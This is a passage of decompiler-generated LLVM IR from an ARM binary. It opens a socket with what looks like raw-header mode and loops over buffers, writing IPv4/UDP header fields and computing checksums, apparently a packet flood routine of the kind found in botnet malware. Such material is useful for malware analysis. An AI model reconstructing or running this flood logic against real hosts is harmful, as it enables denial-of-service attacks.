  store i32 %v3_b160, i32* %r0.global-to-local, align 4
  %v7_b164 = icmp eq i32 %v3_b160, -1
  store i1 %v7_b164, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b164, label %dec_label_pc_b5e4, label %dec_label_pc_b170

dec_label_pc_b170:                                ; preds = %dec_label_pc_b00c
  store i32 1, i32* %stack_var_-40, align 4
  %v6_b178 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_b178, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v6_b18c = call i32 @function_13f20(i32 %v3_b160, i32 0, i32 3, i32* nonnull %stack_var_-40, i32 4)
  store i32 %v6_b18c, i32* %r0.global-to-local, align 4
  %v7_b190 = icmp eq i32 %v6_b18c, -1
  store i1 %v7_b190, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b190, label %dec_label_pc_b5dc, label %dec_label_pc_b198

dec_label_pc_b198:                                ; preds = %dec_label_pc_b170
  %v0_b198 = load i32, i32* @sl, align 4
  %v0_b1a4 = load i32, i32* @r8, align 4
  %v3_b1a4 = mul i32 %v0_b1a4, 65536
  store i32 %v3_b1a4, i32* %r8.global-to-local, align 4
  %v0_b1a8 = load i32, i32* @r7, align 4
  %v0_b1ac = load i32, i32* @r6, align 4
  %v1_b1ac = urem i32 %v0_b1ac, 256
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_b1b4 = urem i32 %v0_b198, 65536
  store i32 %v3_b1b4, i32* %r2.global-to-local, align 4
  %v3_b1b8 = urem i32 %v0_b1a4, 65536
  store i32 %v3_b1b8, i32* %r3.global-to-local, align 4
  %v0_b1bc = load i32, i32* @fp, align 4
  %v2_b1bc = icmp eq i32 %v0_b1bc, 0
  store i1 %v2_b1bc, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  %v3_b1cc = urem i32 %v0_b1a8, 65536
  store i32 %v3_b1cc, i32* @sl, align 4
  %tmp84 = icmp slt i32 %v0_b1bc, 1
  br i1 %tmp84, label %dec_label_pc_b708, label %dec_label_pc_b1dc

dec_label_pc_b1dc:                                ; preds = %dec_label_pc_b198
  %v3_b1e0 = mul i32 %v5_b0f8, 65536
  %v1_b1e4 = add i32 %v3_b1e0, 3407872
  %v3_b1ec = udiv i32 %v1_b1e4, 256
  %v0_b1a8.not = or i32 %v0_b1a8, -65536
  %v1_b1fc = xor i32 %v0_b1a8.not, 65535
  %v1_b200 = urem i32 %v0_b1a4, 256
  %tmp85 = mul nsw i32 %v1_b1fc, 256
  %v1_b218 = and i32 %v3_b1ec, 65280
  %v1_b21c = add i32 %v3_b1e0, 524288
  %v4_b220 = udiv i32 %v1_b1e4, 16777216
  %v5_b220 = or i32 %v1_b218, %v4_b220
  store i32 %v5_b220, i32* %r0.global-to-local, align 4
  %v1_b224 = add i32 %v3_b1e0, 1835008
  %v1_b22c = and i32 %tmp85, and (i32 ptrtoint (i32* @global_var_ff00.24 to i32), i32 16776960)
  store i32 %v1_b22c, i32* @lr, align 4
  %tmp86 = udiv i32 %v1_b1fc, 256
  %tmp87 = udiv i32 %v0_b1a8, 256
  %v5_b240 = trunc i32 %tmp86 to i8
  %tmp88 = udiv i32 %v0_b198, 256
  %sext29 = mul i32 %tmp87, 16777216
  %v4_b260 = sdiv i32 %sext29, 16777216
  %v3_b26c = mul nuw nsw i32 %v1_b200, 256
  store i32 %v3_b26c, i32* @r5, align 4
  %v3_b270 = udiv i32 %v1_b21c, 256
  %tmp89 = udiv i32 %v0_b1a4, 256
  %v4_b278 = urem i32 %tmp89, 256
  %v5_b278 = or i32 %v4_b278, %v3_b26c
  store i32 %v5_b278, i32* @r7, align 4
  %v3_b27c = ashr i32 %sext29, 31
  %v3_b288 = sdiv i32 %v1_b224, 16777216
  %v1_b28c = and i32 %v3_b270, 65280
  store i32 %v1_b28c, i32* @r6, align 4
  %sext30 = mul i32 %tmp88, 16777216
  %v4_b294 = sdiv i32 %sext30, 16777216
  %v3_b298 = ashr i32 %v1_b224, 31
  %v3_b29c = udiv i32 %v1_b1fc, 65536
  %v4_b2a0 = udiv i32 %v1_b21c, 16777216
  %v5_b2a0 = or i32 %v1_b28c, %v4_b2a0
  store i32 %v5_b2a0, i32* %r8.global-to-local, align 4
  %v3_b2ac = ashr i32 %sext30, 31
  store i32 %v3_b2ac, i32* %r1.global-to-local, align 4
  store i32 %v1_b200, i32* %r2.global-to-local, align 4
  %v3_b2b441 = udiv i32 %v1_b28c, 256
  store i32 %v3_b2b441, i32* %r3.global-to-local, align 4
  %v5_b2bc = trunc i32 %v3_b2ac to i8
  store i32 0, i32* @r4, align 4
  %v4_b318 = sext i8 %v5_b09c to i32
  %sext = mul i32 %v1_b1e4, 256
  %v4_b320 = sdiv i32 %sext, 16777216
  %sext16 = mul nuw i32 %v4_b220, 16777216
  %v4_b330 = sdiv i32 %sext16, 16777216
  %v2_b404 = icmp eq i32 %v1_b1ac, 0
  %sext20 = mul i32 %v1_b21c, 256
  %v4_b424 = sdiv i32 %sext20, 16777216
  %sext21 = mul i32 %v0_b1a4, 16777216
  %v7_b43c = sdiv i32 %sext21, 16777216
  %v1_b32c = trunc i32 %v4_b320 to i8
  br label %dec_label_pc_b2cc

dec_label_pc_b2cc:                                ; preds = %bb96, %dec_label_pc_b1dc
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_b2d8 = call i32 @function_14254(i32 1510, i32 4)
  store i32 %v2_b2d8, i32* %r0.global-to-local, align 4
  store i32 %v2_b02c, i32* %r1.global-to-local, align 4
  %v3_b2e0 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_b2e0, i32* %r3.global-to-local, align 4
  %v2_b2e4 = load i32, i32* @r4, align 4
  %v5_b2e4 = mul i32 %v2_b2e4, 4
  %v6_b2e4 = add i32 %v5_b2e4, %v2_b02c
  %v7_b2e4 = inttoptr i32 %v6_b2e4 to i32*
  store i32 %v2_b2d8, i32* %v7_b2e4, align 4
  %v0_b2e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_b2e8 = load i32, i32* %r3.global-to-local, align 4
  %v4_b2e8 = mul i32 %v1_b2e8, 4
  %v5_b2e8 = add i32 %v4_b2e8, %v0_b2e8
  %v6_b2e8 = inttoptr i32 %v5_b2e8 to i32*
  %v7_b2e8 = load i32, i32* %v6_b2e8, align 4
  store i32 %v7_b2e8, i32* %r4.global-to-local, align 4
  %v1_b2ec = inttoptr i32 %v7_b2e8 to i8*
  %v2_b2ec = load i8, i8* %v1_b2ec, align 1
  %tmp = urem i8 %v2_b2ec, 16
  %v1_b2f0 = zext i8 %tmp to i32
  %v1_b2f4 = or i32 %v1_b2f0, 64
  store i32 %v1_b2f4, i32* %r2.global-to-local, align 4
  %v1_b2f8 = trunc i32 %v1_b2f4 to i8
  store i8 %v1_b2f8, i8* %v1_b2ec, align 1
  %v0_b2fc = load i32, i32* %r4.global-to-local, align 4
  %v1_b2fc = inttoptr i32 %v0_b2fc to i8*
  %v2_b2fc = load i8, i8* %v1_b2fc, align 1
  %v1_b300 = and i8 %v2_b2fc, -16
  %v1_b304 = or i8 %v1_b300, 5
  store i32 %v1_b0ac, i32* %r2.global-to-local, align 4
  store i8 %v1_b304, i8* %v1_b2fc, align 1
  %v2_b314 = load i32, i32* %r4.global-to-local, align 4
  %v3_b314 = add i32 %v2_b314, 1
  %v4_b314 = inttoptr i32 %v3_b314 to i8*
  store i8 %v5_b064, i8* %v4_b314, align 1
  store i32 %v4_b318, i32* %r1.global-to-local, align 4
  %v2_b31c = load i32, i32* %r4.global-to-local, align 4
  %v3_b31c = add i32 %v2_b31c, 8
  %v4_b31c = inttoptr i32 %v3_b31c to i8*
  store i8 %v5_b09c, i8* %v4_b31c, align 1
  store i32 %v4_b320, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_b328 = load i32, i32* %r2.global-to-local, align 4
  %v9_b328 = icmp eq i32 %v0_b328, 0
  store i1 %v9_b328, i1* %cpsr_z.global-to-local, align 1
  %v2_b32c = load i32, i32* %r4.global-to-local, align 4
  %v3_b32c = add i32 %v2_b32c, 3
  %v4_b32c = inttoptr i32 %v3_b32c to i8*
  store i8 %v1_b32c, i8* %v4_b32c, align 1
  store i32 %v4_b330, i32* %r2.global-to-local, align 4
  %v0_b334 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b334, label %.thread23, label %.thread

.thread:                                          ; preds = %dec_label_pc_b2cc
  %v1_b334 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v1_b334, i32* %r3.global-to-local, align 4
  %v2_b338 = trunc i32 %v1_b334 to i8
  %v3_b338 = load i32, i32* %r4.global-to-local, align 4
  %v4_b338 = add i32 %v3_b338, 7
  %v5_b338 = inttoptr i32 %v4_b338 to i8*
  store i8 %v2_b338, i8* %v5_b338, align 1
  %v0_b33c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b33c.pr.pr, label %.thread23, label %bb

bb:                                               ; preds = %.thread
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_b340 = load i32, i32* %r4.global-to-local, align 4
  %v4_b340 = add i32 %v3_b340, 6
  %v5_b340 = inttoptr i32 %v4_b340 to i8*
  store i8 64, i8* %v5_b340, align 1
  br label %.thread23

.thread23:                                        ; preds = %dec_label_pc_b2cc, %.thread, %bb
  %v0_b344 = load i32, i32* %r2.global-to-local, align 4
  %v1_b344 = trunc i32 %v0_b344 to i8
  %v2_b344 = load i32, i32* %r4.global-to-local, align 4
  %v3_b344 = add i32 %v2_b344, 2
  %v4_b344 = inttoptr i32 %v3_b344 to i8*
  store i8 %v1_b344, i8* %v4_b344, align 1
  store i32 %v3_b27c, i32* %r2.global-to-local, align 4
  store i32 %v4_b260, i32* %r1.global-to-local, align 4
  %v2_b354 = load i32, i32* %r4.global-to-local, align 4
  %v3_b354 = add i32 %v2_b354, 9
  %v4_b354 = inttoptr i32 %v3_b354 to i8*
  store i8 47, i8* %v4_b354, align 1
  %v0_b358 = load i32, i32* %r2.global-to-local, align 4
  %v1_b358 = trunc i32 %v0_b358 to i8
  %v2_b358 = load i32, i32* %r4.global-to-local, align 4
  %v3_b358 = add i32 %v2_b358, 5
  %v4_b358 = inttoptr i32 %v3_b358 to i8*
  store i8 %v1_b358, i8* %v4_b358, align 1
  %v3_b35c = load i32, i32* %stack_var_-40, align 4
  %v5_b364 = mul i32 %v3_b35c, 24
  store i32 %v5_b364, i32* %r3.global-to-local, align 4
  store i32 %v5_b14c, i32* %r2.global-to-local, align 4
  %v1_b36c = load i32, i32* %r4.global-to-local, align 4
  %v2_b36c = add i32 %v1_b36c, 12
  %v3_b36c = inttoptr i32 %v2_b36c to i32*
  store i32 %v5_b14c, i32* %v3_b36c, align 4
  %v0_b370 = load i32, i32* %r3.global-to-local, align 4
  %v1_b370 = load i32, i32* @sb, align 4
  %v2_b370 = add i32 %v1_b370, %v0_b370
  store i32 %v2_b370, i32* %r3.global-to-local, align 4
  %v0_b374 = load i32, i32* %r1.global-to-local, align 4
  %v1_b374 = trunc i32 %v0_b374 to i8
  %v2_b374 = load i32, i32* %r4.global-to-local, align 4
  %v3_b374 = add i32 %v2_b374, 4
  %v4_b374 = inttoptr i32 %v3_b374 to i8*
  store i8 %v1_b374, i8* %v4_b374, align 1
  %v0_b378 = load i32, i32* %r3.global-to-local, align 4
  %v1_b378 = add i32 %v0_b378, 16
  %v2_b378 = inttoptr i32 %v1_b378 to i32*
  %v3_b378 = load i32, i32* %v2_b378, align 4
  store i32 %v3_b378, i32* %r2.global-to-local, align 4
  %v0_b37c = load i32, i32* %r4.global-to-local, align 4
  %v1_b37c = add i32 %v0_b37c, 20
  store i32 %v1_b37c, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  %v0_b384 = load i32, i32* %r0.global-to-local, align 4
  %v1_b384 = trunc i32 %v0_b384 to i8
  %v3_b384 = add i32 %v0_b37c, 23
  %v4_b384 = inttoptr i32 %v3_b384 to i8*
  store i8 %v1_b384, i8* %v4_b384, align 1
  %v0_b388 = load i32, i32* %r3.global-to-local, align 4
  %v1_b388 = trunc i32 %v0_b388 to i8
  %v2_b388 = load i32, i32* %r1.global-to-local, align 4
  %v3_b388 = add i32 %v2_b388, 2
  %v4_b388 = inttoptr i32 %v3_b388 to i8*
  store i8 %v1_b388, i8* %v4_b388, align 1
  %v0_b38c = load i32, i32* %r4.global-to-local, align 4
  %v1_b38c = add i32 %v0_b38c, 24
  %v2_b38c = inttoptr i32 %v1_b38c to i8*
  %v3_b38c = load i8, i8* %v2_b38c, align 1
  %tmp104 = urem i8 %v3_b38c, 16
  %v1_b390 = zext i8 %tmp104 to i32
  %v1_b394 = or i32 %v1_b390, 64
  store i32 %v1_b394, i32* %r3.global-to-local, align 4
  %v1_b398 = trunc i32 %v1_b394 to i8
  store i8 %v1_b398, i8* %v2_b38c, align 1
  %v0_b39c = load i32, i32* %r2.global-to-local, align 4
  %v1_b39c = load i32, i32* %r4.global-to-local, align 4
  %v2_b39c = add i32 %v1_b39c, 16
  %v3_b39c = inttoptr i32 %v2_b39c to i32*
  store i32 %v0_b39c, i32* %v3_b39c, align 4
  %v0_b3a0 = load i32, i32* %r4.global-to-local, align 4
  %v1_b3a0 = add i32 %v0_b3a0, 24
  %v2_b3a0 = inttoptr i32 %v1_b3a0 to i8*
  %v3_b3a0 = load i8, i8* %v2_b3a0, align 1
  %v1_b3a4 = and i8 %v3_b3a0, -16
  %v1_b3a8 = or i8 %v1_b3a4, 5
  store i8 %v1_b3a8, i8* %v2_b3a0, align 1
  %v0_b3b4 = load i32, i32* %r4.global-to-local, align 4
  %v1_b3b4 = add i32 %v0_b3b4, 24
  store i32 %v1_b3b4, i32* @r5, align 4
  %v3_b3b8 = add i32 %v0_b3b4, 25
  %v4_b3b8 = inttoptr i32 %v3_b3b8 to i8*
  store i8 %v5_b064, i8* %v4_b3b8, align 1
  store i32 %v3_b288, i32* %r1.global-to-local, align 4
  store i32 %tmp86, i32* %r3.global-to-local, align 4
  store i32 %v3_b298, i32* %r2.global-to-local, align 4
  %v2_b3c8 = load i32, i32* @r5, align 4
  %v3_b3c8 = add i32 %v2_b3c8, 4
  %v4_b3c8 = inttoptr i32 %v3_b3c8 to i8*
  store i8 %v5_b240, i8* %v4_b3c8, align 1
  %v0_b3cc = load i32, i32* %r1.global-to-local, align 4
  %v1_b3cc = trunc i32 %v0_b3cc to i8
  %v2_b3cc = load i32, i32* @r5, align 4
  %v3_b3cc = add i32 %v2_b3cc, 2
  %v4_b3cc = inttoptr i32 %v3_b3cc to i8*
  store i8 %v1_b3cc, i8* %v4_b3cc, align 1
  %v0_b3d0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b3d0, label %bb91, label %bb90

bb90:                                             ; preds = %.thread23
  store i32 64, i32* %r3.global-to-local, align 4
  br label %bb91

bb91:                                             ; preds = %.thread23, %bb90
  store i32 %v3_b29c, i32* %r1.global-to-local, align 4
  %v0_b3d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_b3d8 = trunc i32 %v0_b3d8 to i8
  %v2_b3d8 = load i32, i32* @r5, align 4
  %v3_b3d8 = add i32 %v2_b3d8, 3
  %v4_b3d8 = inttoptr i32 %v3_b3d8 to i8*
  store i8 %v1_b3d8, i8* %v4_b3d8, align 1
  store i32 %v4_b318, i32* %r2.global-to-local, align 4
  %v0_b3e0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b3e0, label %bb93, label %bb92

bb92:                                             ; preds = %bb91
  %v1_b3e0 = load i32, i32* %r3.global-to-local, align 4
  %v2_b3e0 = trunc i32 %v1_b3e0 to i8
  %v3_b3e0 = load i32, i32* @r5, align 4
  %v4_b3e0 = add i32 %v3_b3e0, 6
  %v5_b3e0 = inttoptr i32 %v4_b3e0 to i8*
  store i8 %v2_b3e0, i8* %v5_b3e0, align 1
  br label %bb93

bb93:                                             ; preds = %bb91, %bb92
  store i32 17, i32* %r3.global-to-local, align 4
  %v0_b3e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_b3e8 = trunc i32 %v0_b3e8 to i8
  %v2_b3e8 = load i32, i32* @r5, align 4
  %v3_b3e8 = add i32 %v2_b3e8, 5
  %v4_b3e8 = inttoptr i32 %v3_b3e8 to i8*
  store i8 %v1_b3e8, i8* %v4_b3e8, align 1
  %v0_b3ec = load i32, i32* %r2.global-to-local, align 4
  %v1_b3ec = trunc i32 %v0_b3ec to i8
  %v2_b3ec = load i32, i32* @r5, align 4
  %v3_b3ec = add i32 %v2_b3ec, 8
  %v4_b3ec = inttoptr i32 %v3_b3ec to i8*
  store i8 %v1_b3ec, i8* %v4_b3ec, align 1
  %v0_b3f0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b3f0, label %bb95, label %bb94

bb94:                                             ; preds = %bb93
  %v1_b3f0 = load i32, i32* %r0.global-to-local, align 4
  %v2_b3f0 = trunc i32 %v1_b3f0 to i8
  %v3_b3f0 = load i32, i32* @r5, align 4
  %v4_b3f0 = add i32 %v3_b3f0, 7
  %v5_b3f0 = inttoptr i32 %v4_b3f0 to i8*
  store i8 %v2_b3f0, i8* %v5_b3f0, align 1
  br label %bb95

bb95:                                             ; preds = %bb93, %bb94
  %v0_b3f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_b3f4 = trunc i32 %v0_b3f4 to i8
  %v2_b3f4 = load i32, i32* @r5, align 4
  %v3_b3f4 = add i32 %v2_b3f4, 9
  %v4_b3f4 = inttoptr i32 %v3_b3f4 to i8*
  store i8 %v1_b3f4, i8* %v4_b3f4, align 1
  %v0_b3f8 = call i32 @function_fe60()
  store i32 %v0_b3f8, i32* %r0.global-to-local, align 4
  store i32 %v1_b1ac, i32* %r1.global-to-local, align 4
  store i1 %v2_b404, i1* %cpsr_z.global-to-local, align 1
  %v1_b408 = sub i32 1023, %v0_b3f8
  store i32 %v1_b408, i32* %r3.global-to-local, align 4
  br i1 %v2_b404, label %.thread24, label %.thread25

.thread24:                                        ; preds = %bb95
  %v2_b410 = load i32, i32* @r5, align 4
  %v3_b410 = add i32 %v2_b410, 16
  %v4_b410 = inttoptr i32 %v3_b410 to i32*
  store i32 %v1_b408, i32* %v4_b410, align 4
  br label %bb96

.thread25:                                        ; preds = %bb95
  %v1_b40c = load i32, i32* %r4.global-to-local, align 4
  %v2_b40c = add i32 %v1_b40c, 16
  %v3_b40c = inttoptr i32 %v2_b40c to i32*
  %v4_b40c = load i32, i32* %v3_b40c, align 4
  store i32 %v4_b40c, i32* %r3.global-to-local, align 4
  %v2_b414 = load i32, i32* @r5, align 4
  %v3_b414 = add i32 %v2_b414, 16
  %v4_b414 = inttoptr i32 %v3_b414 to i32*
  store i32 %v4_b40c, i32* %v4_b414, align 4
  br label %bb96

bb96:                                             ; preds = %.thread24, %.thread25
  store i32 %v4_b294, i32* %r3.global-to-local, align 4
  %v0_b41c = load i32, i32* %r4.global-to-local, align 4
  %v1_b41c = add i32 %v0_b41c, 44
  store i32 %v1_b41c, i32* @r6, align 4
  %v1_b420 = load i32, i32* @r5, align 4
  %v2_b420 = add i32 %v1_b420, 12
  %v3_b420 = inttoptr i32 %v2_b420 to i32*
  store i32 %v0_b3f8, i32* %v3_b420, align 4
  store i32 %v4_b424, i32* %r2.global-to-local, align 4
  %v0_b428 = load i32, i32* %r3.global-to-local, align 4
  %v1_b428 = trunc i32 %v0_b428 to i8
  %v2_b428 = load i32, i32* @r6, align 4
  %v3_b428 = inttoptr i32 %v2_b428 to i8*
  store i8 %v1_b428, i8* %v3_b428, align 1
  %v3_b42c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_b42c, i32* %r3.global-to-local, align 4
  %v0_b430 = load i32, i32* %r2.global-to-local, align 4
  %v1_b430 = trunc i32 %v0_b430 to i8
  %v2_b430 = load i32, i32* @r6, align 4
  %v3_b430 = add i32 %v2_b430, 5
  %v4_b430 = inttoptr i32 %v3_b430 to i8*
  store i8 %v1_b430, i8* %v4_b430, align 1
  %v0_b434 = load i32, i32* %r3.global-to-local, align 4
  %v1_b434 = add i32 %v0_b434, 1
  store i32 %v1_b434, i32* @r4, align 4
  store i32 %v3_b2ac, i32* %r1.global-to-local, align 4
  store i32 %v7_b43c, i32* %r2.global-to-local, align 4
  %v1_b440 = load i32, i32* @fp, align 4
  %v9_b440 = icmp eq i32 %v1_b434, %v1_b440
  store i1 %v9_b440, i1* %cpsr_z.global-to-local, align 1
  %v2_b444 = load i32, i32* @r6, align 4
  %v3_b444 = add i32 %v2_b444, 1
  %v4_b444 = inttoptr i32 %v3_b444 to i8*
  store i8 %v5_b2bc, i8* %v4_b444, align 1
  %v0_b448 = load i32, i32* @r7, align 4
  %v1_b448 = trunc i32 %v0_b448 to i8
  %v2_b448 = load i32, i32* @r6, align 4
  %v3_b448 = add i32 %v2_b448, 2
  %v4_b448 = inttoptr i32 %v3_b448 to i8*
  store i8 %v1_b448, i8* %v4_b448, align 1
  %v0_b44c = load i32, i32* %r2.global-to-local, align 4
  %v1_b44c = trunc i32 %v0_b44c to i8
  %v2_b44c = load i32, i32* @r6, align 4
  %v3_b44c = add i32 %v2_b44c, 3
  %v4_b44c = inttoptr i32 %v3_b44c to i8*
  store i8 %v1_b44c, i8* %v4_b44c, align 1
  %v0_b450 = load i32, i32* %r8.global-to-local, align 4
  %v1_b450 = trunc i32 %v0_b450 to i8
  %v2_b450 = load i32, i32* @r6, align 4
  %v3_b450 = add i32 %v2_b450, 4
  %v4_b450 = inttoptr i32 %v3_b450 to i8*
  store i8 %v1_b450, i8* %v4_b450, align 1
  %v0_b454 = load i32, i32* @r4, align 4
  store i32 %v0_b454, i32* %stack_var_-40, align 4
  %v5_b458 = icmp slt i32 %v1_b434, %v1_b440
  br i1 %v5_b458, label %dec_label_pc_b2cc, label %dec_label_pc_b45c

dec_label_pc_b45c:                                ; preds = %bb96
  %v1_b464 = add i32 %v5_b0f8, 8
  store i32 %v1_b464, i32* %r3.global-to-local, align 4
  %v1_b468 = add i32 %v5_b0f8, 52
  store i32 %v1_b468, i32* %r1.global-to-local, align 4
  %v0_b474.pre.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_b474.preheader

dec_label_pc_b474.preheader:                      ; preds = %dec_label_pc_b45c, %dec_label_pc_b708
  %v0_b474.pre = phi i32 [ %v0_b474.pre.pre, %dec_label_pc_b45c ], [ %v0_b1bc, %dec_label_pc_b708 ]
  %stack_var_-120.0.ph = phi i32 [ %v1_b468, %dec_label_pc_b45c ], [ %v1_b714, %dec_label_pc_b708 ]
  %stack_var_-152.0.ph = phi i32 [ %v1_b464, %dec_label_pc_b45c ], [ %v1_b710, %dec_label_pc_b708 ]
  %v2_b6ec = icmp eq i32 %v1_b118, 0
  %v2_b4ec = icmp eq i32 %v1_b1ac, 0
  %v2_b4b8 = icmp eq i32 %v5_b14c, -1
  %v7_b4b8 = icmp eq i32 %v5_b14c, -1
  br label %dec_label_pc_b474

dec_label_pc_b474:                                ; preds = %dec_label_pc_b508, %dec_label_pc_b474.preheader
  %v0_b474 = phi i32 [ %v0_b474.pre, %dec_label_pc_b474.preheader ], [ %v1_b5cc, %dec_label_pc_b508 ]
  %v2_b474 = icmp eq i32 %v0_b474, 0
  store i1 %v2_b474, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %tmp97 = icmp slt i32 %v0_b474, 1
  br label %dec_label_pc_b47c

dec_label_pc_b47c:                                ; preds = %dec_label_pc_b47c, %dec_label_pc_b474
  br i1 %tmp97, label %dec_label_pc_b47c, label %dec_label_pc_b480

dec_label_pc_b480:                                ; preds = %dec_label_pc_b47c
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_b48c

dec_label_pc_b48c:                                ; preds = %dec_label_pc_b508, %dec_label_pc_b480
  %v1_b4a0 = phi i32 [ %v1_b5c8, %dec_label_pc_b508 ], [ 0, %dec_label_pc_b480 ]
  %v5_b490 = mul i32 %v1_b4a0, 24
  %v1_b494 = load i32, i32* @sb, align 4
  %v2_b494 = add i32 %v1_b494, %v5_b490
  store i32 %v2_b494, i32* %r3.global-to-local, align 4
  store i32 %v2_b02c, i32* %r1.global-to-local, align 4
  %v1_b49c = add i32 %v2_b494, 20
  %v2_b49c = inttoptr i32 %v1_b49c to i8*
  %v3_b49c = load i8, i8* %v2_b49c, align 1
  %v4_b49c = zext i8 %v3_b49c to i32
  store i32 %v4_b49c, i32* %r2.global-to-local, align 4
  %v4_b4a0 = mul i32 %v1_b4a0, 4
  %v5_b4a0 = add i32 %v4_b4a0, %v2_b02c
  %v6_b4a0 = inttoptr i32 %v5_b4a0 to i32*
  %v7_b4a0 = load i32, i32* %v6_b4a0, align 4
  store i32 %v7_b4a0, i32* @r5, align 4
  %v7_b4a4 = icmp eq i8 %v3_b49c, 31
  store i1 %v7_b4a4, i1* %cpsr_z.global-to-local, align 1
  %v1_b4a8 = add i32 %v7_b4a0, 24
  store i32 %v1_b4a8, i32* @r6, align 4
  %v1_b4ac = add i32 %v7_b4a0, 44
  store i32 %v1_b4ac, i32* @r7, align 4
  %tmp105 = icmp ult i8 %v3_b49c, 32
  br i1 %tmp105, label %dec_label_pc_b5ec, label %dec_label_pc_b4b4

dec_label_pc_b4b4:                                ; preds = %dec_label_pc_b48c
  store i32 %v5_b14c, i32* %r2.global-to-local, align 4
  store i1 %v7_b4b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b4b8, label %dec_label_pc_b654, label %dec_label_pc_b4c0

dec_label_pc_b4c0:                                ; preds = %dec_label_pc_b5ec, %dec_label_pc_b4b4
  store i32 65535, i32* @r4, align 4
  %v0_b4c8 = load i32, i32* @sl, align 4
  %v9_b4c8 = icmp eq i32 %v0_b4c8, 65535
  store i1 %v9_b4c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b4c8, label %dec_label_pc_b66c, label %dec_label_pc_b4d0

dec_label_pc_b4d0:                                ; preds = %dec_label_pc_b654.dec_label_pc_b4d0_crit_edge, %dec_label_pc_b4c0
  %v1_b4d4 = phi i32 [ %v1_b4d4.pre, %dec_label_pc_b654.dec_label_pc_b4d0_crit_edge ], [ 65535, %dec_label_pc_b4c0 ]
  store i32 %v3_b1b4, i32* %r3.global-to-local, align 4
  %v9_b4d4 = icmp eq i32 %v3_b1b4, %v1_b4d4
  store i1 %v9_b4d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b4d4, label %dec_label_pc_b6a4, label %dec_label_pc_b4dc

dec_label_pc_b4dc:                                ; preds = %dec_label_pc_b66c.dec_label_pc_b4dc_crit_edge, %dec_label_pc_b4d0
  %v1_b4e0 = phi i32 [ %v1_b4e0.pre, %dec_label_pc_b66c.dec_label_pc_b4dc_crit_edge ], [ %v1_b4d4, %dec_label_pc_b4d0 ]
  store i32 %v3_b1b8, i32* %r1.global-to-local, align 4
  %v9_b4e0 = icmp eq i32 %v3_b1b8, %v1_b4e0
  store i1 %v9_b4e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b4e0, label %dec_label_pc_b6c0, label %dec_label_pc_b4e8

dec_label_pc_b4e8:                                ; preds = %dec_label_pc_b6a4, %dec_label_pc_b4dc
  store i32 %v1_b1ac, i32* %r2.global-to-local, align 4
  store i1 %v2_b4ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b4ec, label %dec_label_pc_b6e4, label %.thread26

.thread26:                                        ; preds = %dec_label_pc_b4e8
  %v1_b4f0 = load i32, i32* @r5, align 4
  %v2_b4f0 = add i32 %v1_b4f0, 16
  %v3_b4f0 = inttoptr i32 %v2_b4f0 to i32*
  %v4_b4f0 = load i32, i32* %v3_b4f0, align 4
  store i32 %v4_b4f0, i32* %r3.global-to-local, align 4
  %v2_b4f4 = load i32, i32* @r6, align 4
  %v3_b4f4 = add i32 %v2_b4f4, 16
  %v4_b4f4 = inttoptr i32 %v3_b4f4 to i32*
  store i32 %v4_b4f0, i32* %v4_b4f4, align 4
  br label %dec_label_pc_b4fc

dec_label_pc_b4fc:                                ; preds = %bb102, %.thread26
  store i32 %v1_b118, i32* %r3.global-to-local, align 4
  store i1 %v2_b6ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b6ec, label %dec_label_pc_b508, label %dec_label_pc_b6f8

dec_label_pc_b508:                                ; preds = %dec_label_pc_b4fc, %dec_label_pc_b6e4, %dec_label_pc_b6f8
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_b50c = load i32, i32* @r8, align 4
  %v1_b50c = trunc i32 %v0_b50c to i8
  %v2_b50c = load i32, i32* @r5, align 4
  %v3_b50c = add i32 %v2_b50c, 10
  %v4_b50c = inttoptr i32 %v3_b50c to i8*
  store i8 %v1_b50c, i8* %v4_b50c, align 1
  %v0_b510 = load i32, i32* @r8, align 4
  %v1_b510 = trunc i32 %v0_b510 to i8
  %v2_b510 = load i32, i32* @r5, align 4
  %v3_b510 = add i32 %v2_b510, 11
  %v4_b510 = inttoptr i32 %v3_b510 to i8*
  store i8 %v1_b510, i8* %v4_b510, align 1
  %v0_b514 = load i32, i32* @r5, align 4
  store i32 %v0_b514, i32* @r0, align 4
  %v2_b518 = call i32 @function_e424(i32 %v0_b514, i32 20)
  %v3_b518 = trunc i32 %v2_b518 to i8
  %v4_b51c = sdiv i32 %v2_b518, 256
  store i32 %v4_b51c, i32* %r3.global-to-local, align 4
  %v1_b520 = trunc i32 %v4_b51c to i8
  %v2_b520 = load i32, i32* @r5, align 4
